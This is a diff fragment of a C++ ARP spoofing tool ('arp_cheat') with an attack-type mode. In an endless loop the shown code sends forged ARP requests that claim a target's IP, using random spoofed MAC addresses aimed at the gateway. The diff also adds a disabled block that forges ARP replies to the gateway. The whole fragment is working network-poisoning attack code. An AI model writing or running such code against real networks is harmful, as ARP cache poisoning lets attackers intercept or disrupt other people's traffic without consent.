@@ -276,7 +276,9 @@ int main(int argc, const char *argv[]) {
         return -1;
     }
     arp_cheat_addr_t req_arpbuf;
+    arp_cheat_addr_t rsp_arpbuf;
     req_arpbuf.if_name = ifname;
+    rsp_arpbuf.if_name = ifname;
     if (att_type == 0) {
         if (gw_ip == NULL && if_info.gw_ip_str.size() <= 0) {
             fprintf(stderr, "We need gateway ip!\n");
@@ -291,26 +293,30 @@ int main(int argc, const char *argv[]) {
         while (1) {
             uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
             req_arpbuf.op = 1;
-            req_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
             memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
             bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
             req_arpbuf.arp_snd_ip = target_ip;
-            req_arpbuf.arp_tgt_ip =
-                gw_ip == NULL ? if_info.gw_ip_str.c_str() : gw_ip;
+            req_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
             get_mac_addr(get_rand_mac().c_str(), req_arpbuf.eth_src_mac,
                     ETH_ALEN);
             memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
             send_arp_packet(&req_arpbuf);
-
-
-
-/*
-            memcpy(req_arpbuf.eth_dst_mac, has_gw_mac ? gw_mac : if_info.gw_mac,
+#if 0
+            rsp_arpbuf.op = 2;
+            if (has_gw_mac) {
+                memcpy(rsp_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
+                memcpy(rsp_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
+            } else {
+                memcpy(rsp_arpbuf.eth_dst_mac, if_info.gw_mac, ETH_ALEN);
+                memcpy(rsp_arpbuf.arp_tgt_mac, if_info.gw_mac, ETH_ALEN);
+            }
+            rsp_arpbuf.arp_snd_ip = target_ip;
+            rsp_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
+            get_mac_addr(get_rand_mac().c_str(), rsp_arpbuf.eth_src_mac,
                     ETH_ALEN);
-            memcpy(req_arpbuf.arp_tgt_mac, has_gw_mac ? gw_mac : if_info.gw_mac,
-                    ETH_ALEN);
-            req_arpbuf.arp_snd_ip = target_ip;
-            */
+            memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
+            send_arp_packet(&rsp_arpbuf);
+#endif
             sleep(1);
             fprintf(stdout, ".");
             fflush(stdout);
